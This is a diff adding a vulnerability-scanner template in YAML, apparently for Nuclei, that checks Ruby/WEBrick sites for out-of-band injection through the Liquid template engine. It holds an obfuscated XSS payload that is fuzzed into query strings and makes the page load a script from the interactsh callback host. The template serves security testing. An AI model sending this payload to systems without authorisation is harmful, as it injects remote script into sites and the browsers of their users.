@@ -1,0 +1,42 @@
+id: liquid-oob
+
+info:
+  name: Liquid - Out of Band Template Injection
+  author: 0xAwali,DhiyaneshDK
+  severity: unknown
+  reference:
+    - https://rubygems.org/gems/liquid
+    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
+  metadata:
+    verified: true
+  tags: ssti,dast,oast,oob
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - </script><svg/onload%3d'%2b/"/%2b/onmouseover%3d1/%2b(s%3ddocument.createElement(/script/.source),+s.stack%3dError().stack,+s.src%3d(/,/%2b/{{interactsh-url}}/).slice(2),+document.documentElement.appendChild(s))//'>
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: word
+        part: server
+        words:
+          - "WEBrick"
+          - "Ruby"
